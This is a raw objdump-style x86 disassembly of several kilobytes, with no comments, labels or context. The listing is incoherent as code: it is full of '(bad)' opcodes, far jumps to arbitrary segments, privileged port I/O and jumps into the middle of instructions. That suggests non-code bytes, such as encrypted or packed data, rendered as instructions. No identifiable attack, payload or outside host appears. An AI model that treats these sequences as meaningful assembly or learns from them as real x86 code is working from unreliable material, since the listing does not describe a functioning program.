  414ac9:	dec    ebx
  414aca:	jmp    0x4bd3adfa
  414acf:	neg    ebp
  414ad1:	mov    ah,al
  414ad3:	xor    eax,0x9b540c8d
  414ad8:	mov    eax,ds:0xb49a2857
  414add:	inc    edi
  414ade:	(bad)  
  414adf:	jbe    0x414b3f
  414ae1:	loop   0x414b3b
  414ae3:	sahf   
  414ae4:	mov    al,ds:0x3edf8671
  414ae9:	pop    esi
  414aea:	rep lods eax,DWORD PTR ds:[esi]
  414aec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414aed:	ret    0xf968
  414af0:	xor    al,0x34
  414af2:	inc    edi
  414af3:	sti    
  414af4:	mov    edx,0x2dc52c39
  414af9:	jl     0x414b55
  414afb:	inc    esi
  414afc:	inc    ebp
  414afd:	out    dx,al
  414afe:	mov    bh,0xe5
  414b01:	ret    0xcd6
  414b04:	push   es
  414b05:	or     DWORD PTR [ecx+0x3c785d26],esp
  414b0b:	xor    al,BYTE PTR [ebx-0x7]
  414b0e:	dec    ebp
  414b0f:	lea    esi,[eax+0x24]
  414b12:	ror    DWORD PTR [ebx],cl
  414b14:	test   BYTE PTR [ebx+edx*8-0x19aef36d],bh
  414b1b:	mov    esi,0x91829489
  414b20:	jae    0x414ab2
  414b22:	call   0xd1b70dd1
  414b27:	sub    edx,eax
  414b29:	cmp    al,0x5c
  414b2b:	xchg   esi,eax
  414b2c:	lds    esi,FWORD PTR [ecx+0x7b]
  414b2f:	adc    BYTE PTR [eax],bh
  414b31:	adc    ah,0x26
  414b34:	shr    ebp,0x98
  414b37:	mov    esp,DWORD PTR [ebx-0x271b3651]
  414b3d:	ret    
  414b3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b3f:	cli    
  414b40:	call   0x8f2d:0x3f229713
  414b47:	arpl   WORD PTR [ecx+0x6f],sp
  414b4a:	imul   esp,DWORD PTR [eax],0xfffffff9
  414b4d:	dec    esi
  414b4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b4f:	pop    edx
  414b50:	mov    ds:0x2230397,al
  414b55:	test   cl,dl
  414b57:	add    DWORD PTR [eax-0x667e3428],eax
  414b5d:	call   0xba3ed05e
  414b62:	inc    esi
  414b63:	nop
  414b64:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  414b66:	ror    esi,cl
  414b68:	outs   dx,BYTE PTR ds:[esi]
  414b69:	jo     0x414bdc
  414b6b:	push   ds
  414b6c:	push   0x171b26e8
  414b71:	retf   0x8107
  414b74:	out    dx,al
  414b75:	pop    eax
  414b76:	cmp    DWORD PTR [ebx+eax*2+0x7a],ebp
  414b7a:	cld    
  414b7b:	xchg   edx,eax
  414b7c:	xchg   edi,eax
  414b7d:	xor    ch,BYTE PTR [ebp+0x17]
  414b80:	xchg   ebx,eax
  414b81:	mov    ecx,DWORD PTR [eax+0x1a]
  414b84:	mov    cl,BYTE PTR [edx]
  414b86:	repnz pop eax
  414b88:	(bad)
  414b8b:	mov    esp,0x371efa5a
  414b90:	sub    dh,BYTE PTR [ecx*8-0x5058c0a1]
  414b97:	lods   al,BYTE PTR ds:[esi]
  414b98:	das    
  414b99:	mov    ds:0x4dd6dd7f,eax
  414b9e:	push   ds
  414b9f:	fisub  WORD PTR [edi]
  414ba1:	repz out dx,eax
  414ba3:	push   es
  414ba4:	and    DWORD PTR [ebx],edi
  414ba6:	xlat   BYTE PTR ds:[ebx]
  414ba7:	(bad)  
  414ba8:	push   cs
  414ba9:	mov    ebx,0xd810f58a
  414bae:	adc    DWORD PTR ss:[eax-0x42],ecx
  414bb2:	add    eax,0xd2d29cc
  414bb7:	and    al,BYTE PTR [ecx+0x16]
  414bba:	ja     0x414bc1
  414bbc:	push   0xbc0651f0
  414bc1:	pop    es
  414bc2:	in     al,dx
  414bc3:	jp     0x414bb9
  414bc5:	push   eax
  414bc6:	xchg   BYTE PTR [esi+0x2],ah
  414bc9:	in     eax,dx
  414bca:	push   edi
  414bcb:	rcr    DWORD PTR [ebp+eiz*1+0x77468a49],cl
  414bd2:	fiadd  DWORD PTR [ecx]
  414bd4:	mov    esp,0xb0a6eaef
  414bd9:	lds    ecx,FWORD PTR [ebx-0x5ba8e037]
  414bdf:	dec    edx
  414be0:	mov    ecx,0x9aec9fad
  414be5:	push   ebx
  414be6:	mov    bl,0x4f
  414be8:	mov    ah,0x46
  414bea:	sbb    al,0xcc
  414bec:	add    DWORD PTR [eax],ebx
  414bee:	mov    eax,ds:0xb64affa
  414bf3:	push   ds
  414bf4:	imul   edi,eax,0x7f40b208
  414bfa:	xchg   DWORD PTR ds:0x32824a40,ecx
  414c00:	scas   eax,DWORD PTR es:[di]
  414c02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c03:	sub    dh,0x46
  414c06:	iret   
  414c07:	fs jns 0x414c3c
  414c0a:	pop    eax
  414c0b:	and    DWORD PTR ds:0x3d77f206,0x29f9d85e
  414c15:	sub    bl,BYTE PTR [eax-0x7f]
  414c18:	dec    esp
  414c19:	cmp    al,BYTE PTR [ecx]
  414c1b:	or     BYTE PTR [edx-0x2a],ah
  414c1e:	sbb    edi,DWORD PTR [edi]
  414c20:	mov    ds:0x15522dec,eax
  414c25:	in     al,0x94
  414c27:	adc    ebp,DWORD PTR [ebx+0x7e]
  414c2a:	lods   al,BYTE PTR ds:[esi]
  414c2b:	pop    edx
  414c2c:	arpl   WORD PTR [edi-0x1c],ax
  414c2f:	int3   
  414c30:	cmp    edx,esi
  414c32:	jns    0x414bd4
  414c34:	mov    dh,BYTE PTR [ebx-0x2ae4999f]
  414c3a:	and    ebp,DWORD PTR [edx-0x49064607]
  414c40:	adc    al,0x28
  414c42:	cdq    
  414c43:	repz in eax,0x12
  414c46:	pop    eax
  414c47:	push   edi
  414c48:	sbb    BYTE PTR [eax],al
  414c4a:	or     al,al
  414c4c:	dec    edi
  414c4d:	and    cl,BYTE PTR [ecx]
  414c4f:	mov    edx,0x4d2c9ca3
  414c54:	aas    
  414c55:	jb     0x414c2a
  414c57:	or     esi,DWORD PTR [esi]
  414c59:	pop    eax
  414c5a:	add    BYTE PTR [esp+ebp*4+0xa],0x5f
  414c5f:	xchg   esp,eax
  414c60:	mov    cl,0xf9
  414c62:	int    0x98
  414c64:	or     eax,0x557b080a
  414c69:	je     0x414cb3
  414c6b:	mov    al,0xfc
  414c6d:	push   esi
  414c6e:	mov    esp,DWORD PTR [ebp+edx*2+0x70ac914e]
  414c75:	push   esi
  414c76:	mov    edx,0x91f86aa9
  414c7b:	int3   
  414c7c:	or     esp,DWORD PTR [edi-0x65]
  414c7f:	fcmovbe st,st(2)
  414c81:	fmul   DWORD PTR [ecx+edx*2+0x59d5969e]
  414c88:	fcmovnb st,st(7)
  414c8a:	mov    eax,ds:0xddc9a6dc
  414c8f:	inc    esp
  414c90:	or     DWORD PTR [eax],ebx
  414c92:	push   cs
  414c93:	stc    
  414c94:	ret    0x9d2f
  414c97:	(bad)  
  414c98:	mov    dl,0x24
  414c9a:	xchg   ecx,eax
  414c9b:	(bad)  
  414c9d:	sbb    BYTE PTR [ebp+0x34],bh
  414ca0:	cmp    BYTE PTR [edx-0x62],bh
  414ca3:	test   BYTE PTR [edx],al
  414ca5:	inc    esi
  414ca6:	push   edi
  414ca7:	sti    
  414ca8:	inc    BYTE PTR [edi-0x5ab21cf3]
  414cae:	and    eax,0x9d4675
  414cb3:	in     eax,dx
  414cb4:	inc    esi
  414cb5:	ja     0x414cef
  414cb7:	xor    al,0xf6
  414cb9:	xlat   BYTE PTR ds:[ebx]
  414cba:	cmp    BYTE PTR [edi+0x40],dl
  414cbd:	icebp  
  414cbe:	(bad)  
  414cc0:	fnstcw WORD PTR [edi+0x6845fa1d]
  414cc6:	repz xor eax,0x2eae1cf5
  414ccc:	inc    ebx
  414ccd:	push   ebp
  414cce:	(bad)  [eax+eax*8+0x4b9491ef]
  414cd5:	jle    0x414cc8
  414cd7:	pop    ss
  414cd8:	mov    eax,0x1471d042
  414cdd:	ins    DWORD PTR es:[edi],dx
  414cde:	xchg   esp,eax
  414cdf:	lods   al,BYTE PTR ds:[esi]
  414ce0:	cdq    
  414ce1:	jl     0x414d0a
  414ce3:	fst    DWORD PTR [esi]
  414ce5:	xor    dl,0xbd
  414ce8:	(bad)  
  414ce9:	cmc    
  414cea:	je     0x414c90
  414cec:	mov    ecx,cs
  414cee:	xchg   esp,eax
  414cef:	push   esi
  414cf0:	data16 ds mov ss,WORD PTR gs:[ecx+0x58]
  414cf6:	nop
  414cf7:	push   ds
  414cf8:	das    
  414cf9:	mov    al,0x7c
  414cfb:	jmp    0x665c:0xe34d9648
  414d02:	call   0xf95f:0xac0bfd0e
  414d09:	sub    al,0x3c
  414d0b:	(bad)  [ebx]
  414d0d:	sub    esi,ecx
  414d0f:	imul   eax,edx,0x1a
  414d12:	inc    ebx
  414d13:	ds push 0x76
  414d16:	dec    ecx
  414d17:	adc    BYTE PTR [ecx],ch
  414d19:	adc    esi,ebp
  414d1b:	inc    edi
  414d1c:	pop    ds
  414d1d:	jnp    0x414caf
  414d1f:	pop    ecx
  414d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d21:	mov    DWORD PTR [eax-0x5],esi
  414d24:	jecxz  0x414d33
  414d26:	pop    edi
  414d27:	pop    ds
  414d28:	ds dec ebx
  414d2a:	sbb    DWORD PTR [ebp+0x34154929],edi
  414d30:	push   0xffffffaa
  414d32:	sar    ecx,1
  414d34:	jmp    0x3429:0x901b0cac
  414d3b:	pop    esi
  414d3c:	pop    es
  414d3d:	out    dx,al
  414d3e:	enter  0x6b56,0xc0
  414d42:	arpl   WORD PTR [esi],cx
  414d44:	outs   dx,DWORD PTR ds:[esi]
  414d45:	mov    al,0xc5
  414d47:	jne    0x414ce0
  414d49:	retf   0xe06a
  414d4c:	mov    esi,esp
  414d4e:	pop    ecx
  414d4f:	cwde   
  414d50:	inc    edx
  414d51:	xchg   edi,eax
  414d52:	shl    bh,1
  414d54:	sbb    ecx,DWORD PTR [edi-0x60]
  414d57:	pop    ds
  414d58:	jnp    0x414d69
  414d5a:	hlt    
  414d5b:	sub    BYTE PTR [ecx-0x36],ah
  414d5e:	out    0xf2,eax
  414d60:	jbe    0x414d64
  414d62:	es xchg ecx,eax
  414d64:	push   cs
  414d65:	sbb    ah,ah
  414d67:	rcr    dh,0xcd
  414d6a:	in     eax,0xdb
  414d6c:	mov    eax,ds:0xd1dbce70
  414d71:	cwde   
  414d72:	mov    ecx,0xa4482668
  414d77:	scas   al,BYTE PTR es:[edi]
  414d78:	push   0xc8603601
  414d7d:	ret    
  414d7e:	daa    
  414d7f:	push   edx
  414d80:	or     BYTE PTR [ebx+0x66],al
  414d83:	cmp    al,0x95
  414d85:	sbb    al,0xa8
  414d87:	loop   0x414d74
  414d89:	iret   
  414d8a:	jns    0x414d91
  414d8c:	ret    
  414d8d:	fidivr WORD PTR [esi]
  414d8f:	dec    esi
  414d90:	jmp    0x414d82
  414d92:	pop    esi
  414d93:	stos   DWORD PTR es:[edi],eax
  414d94:	xlat   BYTE PTR ds:[ebx]
  414d95:	jbe    0x414e0f
  414d97:	dec    ah
  414d99:	dec    ebx
  414d9a:	or     eax,0xf7a19f2a
  414d9f:	mov    ds:0x767a81f2,al
  414da4:	test   DWORD PTR [ebx+edi*1],edx
  414da7:	lds    ebx,FWORD PTR [edx+0x31913d8a]
  414dad:	test   DWORD PTR [esi-0x4a],ebp
  414db0:	(bad)  
  414db1:	retf   
  414db2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414db3:	or     BYTE PTR [edi+edi*2+0x22bfbcff],dl
  414dba:	mov    ebp,0xaf1072bd
  414dbf:	repz mov esi,0x3492193f
  414dc5:	push   eax
  414dc6:	sbb    BYTE PTR [ecx],al
  414dc8:	fwait
  414dc9:	xor    esp,eax
  414dcb:	xor    esi,DWORD PTR [ecx+0x44deee07]
  414dd1:	fsub   DWORD PTR [ebp+esi*8-0xa6c5795]
  414dd8:	popa   
  414dd9:	sbb    al,0x7
  414ddb:	rep lods al,BYTE PTR ds:[esi]
  414ddd:	stos   BYTE PTR es:[edi],al
  414dde:	and    bl,BYTE PTR [ecx+0x786c892a]
  414de4:	test   DWORD PTR [eax+edx*1],esp
  414de7:	jns    0x414db1
  414de9:	fsubr  st,st(2)
  414deb:	jg     0x414e0c
  414ded:	ds (bad) 
  414def:	adc    BYTE PTR [ebx-0x74e07ba4],ah
  414df5:	aad    0x56
  414df7:	mov    ebx,0xb763996c
  414dfc:	mov    al,0xda
  414dff:	(bad)  
  414e00:	push   ebx
  414e01:	and    BYTE PTR ds:0xa472326d,ch
  414e07:	pusha  
  414e08:	arpl   sp,bx
  414e0a:	in     al,dx
  414e0b:	in     eax,0xbb
  414e0d:	stos   BYTE PTR es:[edi],al
  414e0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e0f:	and    al,0xea
  414e11:	inc    edi
  414e12:	cdq    
  414e13:	iret   
  414e14:	aas    
  414e15:	bound  ebp,QWORD PTR [ebp-0x2f]
  414e18:	sbb    eax,0x5c3afdf6
  414e1d:	jmp    0x44eb:0x3294de08
  414e24:	push   eax
  414e25:	out    0xb0,eax
  414e27:	mov    edx,edi
  414e29:	pop    ds
  414e2a:	cmp    al,0xbf
  414e2c:	dec    ebx
  414e2d:	into   
  414e2e:	outs   dx,DWORD PTR ds:[esi]
  414e2f:	iret   
  414e30:	jns    0x414dca
  414e32:	test   DWORD PTR [edi-0x78],esi
  414e35:	pop    esp
  414e36:	sahf   
  414e37:	add    BYTE PTR [ecx+0x22e5bcce],bl
  414e3d:	pop    edi
  414e3e:	or     dh,bh
  414e40:	cmp    bh,BYTE PTR [eax-0x357896d3]
  414e46:	inc    edi
  414e47:	xchg   ecx,eax
  414e48:	popa   
  414e49:	aaa    
  414e4a:	dec    edx
  414e4b:	sti    
  414e4c:	mov    ebx,0xc3005939
  414e51:	loop   0x414e43
  414e53:	(bad)  
  414e54:	jmp    0x414e51
  414e56:	loope  0x414e97
  414e58:	dec    edi
  414e59:	jae    0x414e65
  414e5b:	shl    ebx,0xe7
  414e5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e5f:	xchg   DWORD PTR [edx],ebp
  414e61:	jae    0x414e9a
  414e63:	(bad)  
  414e65:	in     eax,dx
  414e66:	or     ebx,DWORD PTR [edi-0x3f]
  414e69:	sahf   
  414e6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e6b:	and    DWORD PTR [ecx],esp
  414e6d:	aas    
  414e6e:	mov    ebp,edi
  414e70:	pop    ds
  414e71:	push   esi
  414e72:	test   eax,0xee1a5688
  414e77:	daa    
  414e78:	mov    eax,ds:0x336b3fda
  414e7d:	leave  
  414e7e:	push   ds
  414e7f:	fidiv  DWORD PTR [ebp+0x1d]
  414e82:	or     DWORD PTR [edi-0x2e0b5035],esi
  414e88:	test   BYTE PTR [ecx+0x10],dh
  414e8b:	(bad)  
  414e8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e8d:	push   eax
  414e8e:	out    dx,eax
  414e8f:	push   edi
  414e90:	ret    
  414e91:	lods   eax,DWORD PTR ds:[esi]
  414e92:	rol    BYTE PTR [edx],1
  414e94:	add    BYTE PTR [ecx+0x74b07a8],0xfb
  414e9b:	mov    ch,BYTE PTR [ebx]
  414e9d:	xlat   BYTE PTR ds:[ebx]
  414e9e:	clc    
  414e9f:	lock mov al,0x3b
  414ea2:	push   ecx
  414ea3:	lea    esi,[ecx]
  414ea5:	mov    esi,0x2a784d4
  414eaa:	in     eax,dx
  414eab:	(bad)  
  414eac:	int3   
  414ead:	jmp    0x6300:0xc6c334c
  414eb4:	push   eax
  414eb5:	cmp    edi,esi
  414eb7:	push   eax
  414eb8:	in     al,0xfa
  414eba:	sub    al,0x5f
  414ebc:	pusha  
  414ebd:	or     al,0x82
  414ebf:	sar    DWORD PTR [ecx+0x74],cl
  414ec2:	es cld 
  414ec4:	addr16 mov edx,0x6f7e13e8
  414eca:	xchg   ecx,eax
  414ecb:	(bad)  
  414ecd:	push   eax
  414ece:	push   edi
  414ecf:	pop    eax
  414ed0:	mov    cl,0xeb
  414ed2:	pop    es
  414ed3:	aam    0x55
  414ed5:	lods   eax,DWORD PTR ds:[esi]
  414ed6:	adc    al,0x8d
  414ed8:	pop    es
  414ed9:	ins    BYTE PTR es:[edi],dx
  414eda:	scas   al,BYTE PTR es:[edi]
  414edb:	jle    0x414e99
  414edd:	es pop edi
  414edf:	dec    ebp
  414ee0:	repnz xor cl,BYTE PTR [ecx-0x3d]
  414ee4:	mov    edx,0x1ec9f8e9
  414ee9:	(bad)  [eax+0x3a]
  414eec:	adc    edx,DWORD PTR [edx-0x2ecf397a]
  414ef2:	inc    esp
  414ef3:	mov    edx,0x91045fc4
  414ef8:	mov    edi,DWORD PTR [edi]
  414efa:	loop   0x414ed5
  414efc:	sbb    eax,0xd4bebe53
  414f01:	add    DWORD PTR [ecx],0x2b
  414f04:	clc    
  414f05:	xchg   edx,eax
  414f06:	pop    eax
  414f07:	out    0x2a,eax
  414f09:	out    0x6b,eax
  414f0b:	xor    BYTE PTR [esi+0x19b7f14f],0xb9
  414f12:	mov    DWORD PTR [ebx+0xb],ebx
  414f15:	sbb    al,BYTE PTR [ecx+0x4acf9707]
  414f1b:	sub    esp,DWORD PTR [edx+ebx*4-0x36eaa4b0]
  414f22:	into   
  414f23:	aaa    
  414f24:	mov    WORD PTR [ecx+0x678d3928],cs
  414f2a:	cmp    BYTE PTR [eax+0xc68540],dl
  414f30:	pop    ds
  414f31:	cmp    al,0xb6
  414f33:	adc    BYTE PTR [ebx-0x4a],bh
  414f36:	dec    edx
  414f37:	repnz push cs
  414f39:	sbb    ecx,DWORD PTR [edi+0x37]
  414f3c:	xor    DWORD PTR [edx-0x7bb72df],0xffffff94
  414f43:	mov    dh,0x72
  414f45:	bound  ebp,QWORD PTR [ecx]
  414f47:	nop
  414f48:	push   esi
  414f49:	ins    DWORD PTR es:[edi],dx
  414f4a:	pop    ecx
  414f4b:	pop    ds
  414f4c:	loope  0x414f61
  414f4e:	cmp    DWORD PTR [edi],ebp
  414f50:	cmp    cl,bh
  414f52:	sub    ebx,ebp
  414f54:	call   0x91d740d0
  414f59:	fcmovnb st,st(6)
  414f5b:	neg    al
  414f5d:	test   ch,bl
  414f5f:	outs   dx,BYTE PTR ds:[esi]
  414f60:	fisttp QWORD PTR [ecx-0x30]
  414f63:	xor    DWORD PTR [esi],0x4ec6ee9e
  414f69:	in     eax,dx
  414f6a:	neg    DWORD PTR [esi+0x722b346b]
  414f70:	xor    al,0x88
  414f72:	icebp  
  414f73:	ret    
  414f74:	xor    DWORD PTR [ebx],ecx
  414f76:	xchg   edx,eax
  414f77:	mov    ch,0x2e
  414f79:	cmp    ebx,DWORD PTR [edi-0xe47c155]
  414f7f:	aaa    
  414f80:	xor    BYTE PTR [ebx],bl
  414f82:	pop    edx
  414f83:	cld    
  414f84:	fsubr  DWORD PTR [ebp-0x37217126]
  414f8a:	aam    0xce
  414f8c:	jns    0x414f65
  414f8e:	cmp    BYTE PTR [ebp+0x227cde44],ah
  414f94:	sbb    BYTE PTR [ebx+eiz*8-0x25],dl
  414f98:	mov    dh,0xe3
  414f9a:	out    0xc,eax
  414f9c:	jl     0x414f3d
  414f9e:	mov    esi,0x5fa3e61c
  414fa3:	outs   dx,DWORD PTR ds:[esi]
  414fa4:	mov    ebx,DWORD PTR [eax-0x657ce6fc]
  414faa:	cdq    
  414fab:	outs   dx,DWORD PTR ds:[esi]
  414fac:	aam    0xe5
  414fae:	xor    esi,DWORD PTR [esi+0x5e]
  414fb1:	xchg   esi,eax
  414fb2:	mov    gs,esp
  414fb4:	mov    dh,0x66
  414fb6:	lahf   
  414fb7:	imul   esi,DWORD PTR [ecx+0x74ac25cd],0x28
  414fbe:	xchg   esi,eax
  414fbf:	xchg   ecx,eax
  414fc0:	lods   eax,DWORD PTR ds:[esi]
  414fc1:	mov    edi,0x9384bcfe
  414fc6:	mov    ebp,0xdf6adc8b
  414fcb:	mov    eax,0xe221ae06
  414fd0:	sbb    cl,BYTE PTR [edi-0x4f]
  414fd3:	pop    ebx
  414fd4:	out    dx,al
  414fd5:	pop    edx
  414fd6:	dec    esp
  414fd7:	push   ebx
  414fd8:	mov    eax,ds:0xfc804ae8
  414fdd:	fsubr  DWORD PTR [ecx]
  414fdf:	fcmovb st,st(1)
  414fe1:	cwde   
  414fe2:	sti    
  414fe3:	jns    0x415058
  414fe5:	je     0x41500b
  414fe7:	push   cs
  414fe8:	cmp    eax,0xbfe048b7
  414fed:	popf   
  414fee:	cmp    ch,BYTE PTR [ebp+edx*2+0x77b2e9c6]
  414ff5:	jnp    0x414ffc
  414ff7:	sub    BYTE PTR [edx-0x3db5c83d],dl
  414ffd:	popa   
  414ffe:	mov    BYTE PTR [ebx+0x6a],bl
  415001:	daa    
  415002:	int3   
  415003:	push   cs
  415004:	sbb    eax,0x62d42a76
  415009:	pusha  
  41500a:	and    eax,0x6cb2cc7a
  41500f:	std    
  415010:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415011:	mov    eax,0xcb6f3d4c
  415016:	mov    bl,0xa0
  415018:	lock hlt 
  41501a:	jp     0x415027
  41501c:	inc    esi
  41501d:	adc    dh,dh
  41501f:	dec    edi
  415020:	and    cl,BYTE PTR [eax]
  415022:	fimul  DWORD PTR [ebp-0x6ca4a893]
  415028:	jnp    0x415088
  41502a:	cmp    ebp,edx
  41502c:	pop    esi
  41502d:	arpl   WORD PTR ds:0xed09be29,bp
  415033:	mov    esp,0xfe821f7e
  415038:	mov    bl,0x1c
  41503a:	jmp    0x415048
  41503c:	mov    ah,0x86
  41503e:	clc    
  41503f:	jmp    0x4150a7
  415041:	cmp    ah,0x3b
  415044:	mov    esi,cs
  415046:	push   0xffffffa4
  415048:	push   esi
  415049:	and    BYTE PTR [ebx],bh
  41504b:	sub    eax,0xd12a0571
  415050:	cmp    DWORD PTR [eax+0x23c8a4ee],ecx
  415056:	adc    eax,0xc1121599
  41505b:	xor    BYTE PTR [edi+0x18c1605d],cl
  415061:	mov    dl,0xd0
  415063:	dec    ecx
  415064:	xor    eax,0x9047dfc0
  415069:	xchg   edx,eax
  41506a:	xchg   ecx,eax
  41506b:	dec    esp
  41506c:	fisub  WORD PTR [edx]
  41506e:	push   es
  41506f:	aaa    
  415070:	ins    BYTE PTR es:[edi],dx
  415071:	not    DWORD PTR [edx-0x192dea00]
  415077:	(bad)  
  415078:	les    esi,FWORD PTR [edx]
  41507a:	(bad)  
  41507b:	mov    esp,0x3b0eccbb
  415080:	aad    0x18
  415082:	sub    al,al
  415084:	push   ebp
  415085:	mov    esi,0x605f2d0e
  41508a:	push   ds
  41508b:	jnp    0x415055
  41508d:	mov    ds:0xf0f3b4b3,al
  415092:	sub    ch,ch
  415094:	test   DWORD PTR [ecx+0x15a96fdf],esi
  41509a:	cld    
  41509b:	or     esi,DWORD PTR [edx]
  41509d:	mov    dl,0x20
  41509f:	test   al,0x2b
  4150a1:	cmp    ebx,DWORD PTR [eax-0x6138e60c]
  4150a7:	inc    eax
  4150a8:	jb     0x4150ab
  4150aa:	cmp    eax,0xc3ef0097
  4150af:	ins    DWORD PTR es:[edi],dx
  4150b0:	mov    ebp,0x5f5e43dd
  4150b5:	int    0xdb
  4150b7:	out    0x8b,al
  4150b9:	daa    
  4150ba:	dec    ebp
  4150bb:	outs   dx,DWORD PTR ds:[esi]
  4150bc:	call   0x8ea3:0x30d7a95b
  4150c3:	mov    WORD PTR [eax],?
  4150c5:	add    al,0x95
  4150c7:	arpl   WORD PTR [ebp+eax*4-0x65a5da03],si
  4150ce:	leave  
  4150cf:	mov    ds:0x3397a2f5,eax
  4150d4:	sbb    eax,DWORD PTR [ebp+0x68]
  4150d7:	pop    ebx
  4150d8:	mov    WORD PTR [ebp+0x52dba9ad],?
  4150de:	sub    BYTE PTR [ecx],bl
  4150e0:	pop    ebx
  4150e1:	in     eax,dx
  4150e2:	arpl   WORD PTR [edx],ax
  4150e4:	xor    eax,0xceb17ccb
  4150e9:	pop    eax
  4150ea:	inc    ecx
  4150eb:	xor    eax,DWORD PTR [esi-0x40673d2f]
  4150f1:	mov    ecx,0xdf6521d5
  4150f6:	or     DWORD PTR [edx],edi
  4150f8:	rcr    BYTE PTR [esi+eiz*1-0xe09d33a],0x9e
  415100:	call   0xe50696e
  415105:	inc    ecx
  415106:	addr16 push ebp
  415108:	in     eax,dx
  415109:	mov    bl,BYTE PTR ds:0x30d666e5
  41510f:	out    0xb7,eax
  415111:	xor    eax,DWORD PTR [esi-0x2]
  415114:	jnp    0x41517c
  415116:	mov    eax,ds:0x706f019b
  41511b:	cmp    edx,DWORD PTR [eax]
  41511d:	js     0x415152
  41511f:	int3   
  415120:	pop    esp
  415121:	dec    edi
  415122:	mov    ch,0x78
  415124:	mov    ecx,0x4a1f0465
  415129:	dec    ecx
  41512a:	sti    
  41512b:	jmp    0x415136
  41512d:	(bad)  
  41512e:	xor    DWORD PTR [ecx],ebx
  415130:	dec    esi
  415131:	add    dh,bh
  415133:	js     0x41512d
  415135:	jne    0x4150d2
  415137:	push   esi
  415138:	test   eax,0xb1ff102a
  41513d:	shr    ebx,1
  41513f:	loope  0x4150df
  415141:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415143:	not    DWORD PTR [ebx-0x58]
  415146:	mov    ds:0xf3e5acc2,al
  41514b:	jae    0x415146
  41514d:	xchg   edx,eax
  41514e:	je     0x415172
  415150:	mov    ch,0x9a
  415152:	ja     0x41513a
  415154:	and    eax,0x61f96aa7
  415159:	out    dx,eax
  41515a:	loope  0x41515f
  41515c:	ret    
  41515d:	sbb    al,0x1e
  41515f:	fs xor al,0xaf
  415162:	es int 0xef
  415165:	test   eax,0xa97e357a
  41516b:	mov    ah,0x50
  41516d:	pop    ebp
  41516e:	xchg   DWORD PTR [ecx+edi*8],ebp
  415171:	(bad)  
  415172:	(bad)  
  415173:	nop
  415174:	repnz adc BYTE PTR [eax],dh
  415177:	out    0xdd,eax
  415179:	in     eax,dx
  41517a:	xchg   edx,eax
  41517b:	fstp   QWORD PTR [edx]
  41517d:	mov    ds:0x968585cd,eax
  415182:	lods   al,BYTE PTR ds:[esi]
  415183:	fdivp  st(5),st
  415185:	stos   BYTE PTR es:[edi],al
  415186:	ss stos BYTE PTR es:[edi],al
  415188:	adc    dh,BYTE PTR [eax-0x8]
  41518b:	jp     0x415202
  41518d:	xor    eax,edx
  41518f:	pop    edx
  415190:	scas   eax,DWORD PTR es:[edi]
  415191:	leave  
  415192:	cmp    ebp,DWORD PTR [esi-0x33cc5dda]
  415198:	mov    ebp,0xc9d0bcb8
  41519d:	mov    BYTE PTR [edi],0xf2
  4151a0:	add    cl,ah
  4151a2:	ja     0x41515e
  4151a4:	and    ecx,ecx
  4151a6:	cmp    ah,BYTE PTR [edi+0x3f798f13]
  4151ac:	and    al,0x4d
  4151ae:	ds cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151b1:	aam    0x42
  4151b3:	cmp    al,0xa9
  4151b5:	jo     0x415190
  4151b7:	push   0x29
  4151b9:	fimul  WORD PTR [ecx+esi*4-0x39]
  4151bd:	jo     0x4151d3
  4151bf:	add    al,0x1c
  4151c1:	sub    al,0xbe
  4151c3:	mov    eax,0xb3a55808
  4151c8:	jmp    0x41519f
  4151ca:	mov    ebx,0x531279ca
  4151cf:	push   eax
  4151d0:	jbe    0x415157
  4151d2:	(bad)  
  4151d3:	imul   DWORD PTR [esi-0x1f3a0828]
  4151d9:	int    0x8c
  4151db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151dc:	lock lods eax,DWORD PTR ds:[esi]
  4151de:	or     ah,al
  4151e0:	stos   BYTE PTR es:[edi],al
  4151e1:	or     DWORD PTR [ecx-0x73],esp
  4151e4:	and    eax,0x2ef1c37b
  4151e9:	pop    esp
  4151ea:	xchg   esp,eax
  4151eb:	xchg   BYTE PTR [edx-0x65],bh
  4151ee:	cdq    
  4151ef:	pop    ds
  4151f0:	outs   dx,DWORD PTR ds:[esi]
  4151f1:	cdq    
  4151f2:	test   al,0xd4
  4151f4:	aas    
  4151f5:	out    dx,al
  4151f6:	call   0x6e0b677
  4151fb:	xchg   esp,eax
  4151fc:	add    eax,0x183ccbb2
  415201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415202:	stc    
  415203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415204:	pop    edi
  415205:	dec    ebx
  415206:	lods   al,BYTE PTR ds:[esi]
  415207:	in     al,dx
  415208:	push   edi
  415209:	cmp    cl,0xf0
  41520c:	pop    ss
  41520d:	in     eax,0x9a
  41520f:	xchg   ebp,eax
  415210:	lods   al,BYTE PTR ds:[esi]
  415211:	(bad)  
  415212:	iret   
  415213:	mov    ds:0x91c21b55,al
  415218:	fdivrp st(6),st
  41521a:	popf   
  41521b:	fdivr  DWORD PTR [edi+0x38]
  41521e:	not    DWORD PTR [ecx-0x7d0b1aa2]
  415224:	pop    eax
  415225:	cmp    eax,DWORD PTR [eax-0x1346b341]
  41522b:	dec    ebx
  41522c:	sahf   
  41522d:	ds push ebx
  41522f:	sub    al,0x77
  415231:	dec    edi
  415232:	mov    al,0x9
  415234:	xchg   edi,eax
  415235:	push   cs
  415236:	repnz add DWORD PTR [ebx+0x6cfdc059],0x52
  41523e:	jl     0x41522f
  415240:	cdq    
  415241:	jmp    0x415275
  415243:	test   al,0xfc
  415245:	dec    eax
